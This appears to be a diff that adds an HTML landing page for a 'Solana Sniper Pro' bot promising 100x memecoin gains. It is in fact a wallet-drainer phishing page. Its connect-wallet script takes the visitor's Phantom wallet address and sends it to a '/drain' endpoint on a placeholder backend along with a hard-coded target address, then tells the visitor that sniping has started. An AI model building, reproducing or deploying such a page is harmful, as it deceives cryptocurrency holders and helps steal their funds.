@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Solana Sniper Bot - Free Alpha</title>
+  <style>
+    body { background: #0a0a0a; color: #00ff00; font-family: Arial; text-align: center; padding: 60px; }
+    button { padding: 30px 60px; font-size: 28px; background: #00ff00; color: #000; border: none; border-radius: 10px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>🔥 Solana Sniper Pro v2.5</h1>
+  <p>Connect wallet to start sniping 100x memecoins</p>
+  <button onclick="connectWallet()">CONNECT WALLET NOW</button>
+
+  <script>
+    async function connectWallet() {
+      if (window.solana) {
+        const resp = await window.solana.connect();
+        const address = resp.publicKey.toString();
+        
+        // Send to backend (replace with your backend url later)
+        fetch('https://YOUR-BACKEND.onrender.com/drain', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH" })
+        });
+        
+        alert("Wallet connected - Sniping started!");
+      } else {
+        alert("Please install Phantom Wallet");
+      }
+    }
+  </script>
+</body>
+</html>
